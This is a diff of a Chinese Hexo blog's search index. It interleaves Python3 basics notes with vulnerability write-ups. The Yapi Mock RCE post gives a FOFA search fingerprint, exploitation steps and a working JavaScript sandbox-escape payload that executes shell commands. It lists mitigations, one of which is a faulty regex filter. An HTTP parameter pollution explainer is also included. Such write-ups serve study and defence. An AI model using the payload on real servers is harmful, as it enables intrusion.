-<li>列表(list): 是序列中的可变序列</li>
-<li>元组(tuple): 是序列中的不可变序列</li>
-<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
-<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
-</ul>
-<h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>列表是可变序列</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 &#x3D; [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br></pre></td></tr></table></figure>
-
-<p>通过索引（index）来获取列表里面的元素<br>索引是从0开始的整数，列表第一个位置索引为0，第二个位置索引为1，第三个位置索引为2，以此类推<br>获取多个索引称为切片</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为1，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-1:-len(a)-1:-1]</span><br></pre></td></tr></table></figure>
-
-<p>可以用切片修改列表<br>对象名[起始索引:结束索引:步长] = [元素1,元素2……]<br>a[len(a):]=[11]    结尾增加<br>a[0:0]=[1,2,3] 固定位置或者开头增加<br>a[0:3] = [1,2,3] 修改前三个</p>
-<p>通过for循环遍历列表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">for 变量 in 序列 :</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python3基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-类与对象</title>
-    <url>//e7374bcdaaf3.html</url>
-    <content><![CDATA[<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象是内存中专门存储数据的一块区域</p>
-<p>对象由三部分：对象的标识（id），对象的类型（type），对象的值（value）</p>
-<p>1.标识用于唯一标识对象，通常对应于对象在计算机内存中的地址。使用内置函数<code>id(obj)</code>可返回对象obj的标识</p>
-<p>2.类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用<code>type(obj)</code>获得对象的所属类型。</p>
-<p>3.值表示对象所存储的数据的信息，使用<code>print(obj)</code>可以直接打印出值。</p>
-<p>对象就是：一个内存块，拥有特定的值，支持特点类型的相关操作</p>
-<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2>]]></content>
       <categories>
         <category>Python3</category>
       </categories>
@@ -970,41 +1028,32 @@
       </tags>
   </entry>
   <entry>
-    <title>Yapi Mock远程代码执行漏洞</title>
-    <url>//3ec6df390048.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
-<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
-<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+    <title>Python3数组</title>
+    <url>//dff4ce1f2267.html</url>
+    <content><![CDATA[<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
+<li>列表(list): 是序列中的可变序列</li>
+<li>元组(tuple): 是序列中的不可变序列</li>
+<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
+<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
+</ul>
+<h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>列表是可变序列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 &#x3D; [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br></pre></td></tr></table></figure>
+
+<p>通过索引（index）来获取列表里面的元素<br>索引是从0开始的整数，列表第一个位置索引为0，第二个位置索引为1，第三个位置索引为2，以此类推<br>获取多个索引称为切片</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为1，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-1:-len(a)-1:-1]</span><br></pre></td></tr></table></figure>
+
+<p>可以用切片修改列表<br>对象名[起始索引:结束索引:步长] = [元素1,元素2……]<br>a[len(a):]=[11]    结尾增加<br>a[0:0]=[1,2,3] 固定位置或者开头增加<br>a[0:3] = [1,2,3] 修改前三个</p>
+<p>通过for循环遍历列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">for 变量 in 序列 :</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
-<p>注册之后新建项目</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
-<p>添加接口</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
-<p>选择高级mock-脚本-开启脚本</p>
-<p>把以下代码粘贴到脚本中</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
-<p>保存代码并预览</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
-<p>2.升级维护版本（非官方）</p>
-<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
-<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
-<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
 ]]></content>
       <categories>
-        <category>漏洞利用</category>
-        <category>web应用漏洞</category>
+        <category>Python3</category>
       </categories>
       <tags>
-        <tag>高危漏洞</tag>
-        <tag>web应用漏洞</tag>
+        <tag>Python3基础知识</tag>
       </tags>
   </entry>
   <entry>
@@ -1119,6 +1168,44 @@
       </tags>
   </entry>
   <entry>
+    <title>Yapi Mock远程代码执行漏洞</title>
+    <url>//3ec6df390048.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
+<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
+<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
+<p>注册之后新建项目</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
+<p>添加接口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
+<p>选择高级mock-脚本-开启脚本</p>
+<p>把以下代码粘贴到脚本中</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
+<p>保存代码并预览</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
+<p>2.升级维护版本（非官方）</p>
+<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
+<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
+<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>web应用漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>web应用漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
     <url>//67bda6fdaf83.html</url>
     <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
@@ -1153,61 +1240,6 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HPP参数污染漏洞</title>
-    <url>//4189faf9a367.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
-<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
-<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
-<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
-<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
-<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
-<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
-<table>
-<thead>
-<tr>
-<th align="center">web服务器</th>
-<th align="center">获取参数函数</th>
-<th align="center">获取到的参数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">PHP/Apache</td>
-<td align="center">$_GET(“test”)</td>
-<td align="center">last</td>
-</tr>
-<tr>
-<td align="center">JSP/Tomcat</td>
-<td align="center">Request.getParameter(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Perl(CGI)/Apache</td>
-<td align="center">Param(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Python/Apache</td>
-<td align="center">getvalue(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-<tr>
-<td align="center">ASP/IIS</td>
-<td align="center">Request.QueryString(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-</tbody></table>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
-<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>低危漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1288,6 +1320,61 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HPP参数污染漏洞</title>
+    <url>//4189faf9a367.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
+<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
+<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
+<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
+<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
+<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">web服务器</th>
+<th align="center">获取参数函数</th>
+<th align="center">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“test”)</td>
+<td align="center">last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tomcat</td>
+<td align="center">Request.getParameter(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
+<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>低危漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1402,6 +1489,23 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>代码执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-类与对象</title>
+    <url>//e7374bcdaaf3.html</url>
+    <content><![CDATA[<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象是内存中专门存储数据的一块区域</p>
+<p>对象由三部分：对象的标识（id），对象的类型（type），对象的值（value）</p>
+<p>1.标识用于唯一标识对象，通常对应于对象在计算机内存中的地址。使用内置函数<code>id(obj)</code>可返回对象obj的标识</p>
+<p>2.类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用<code>type(obj)</code>获得对象的所属类型。</p>
+<p>3.值表示对象所存储的数据的信息，使用<code>print(obj)</code>可以直接打印出值。</p>
+<p>对象就是：一个内存块，拥有特定的值，支持特点类型的相关操作</p>
+<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2>]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python3基础知识</tag>
       </tags>
   </entry>
 </search>
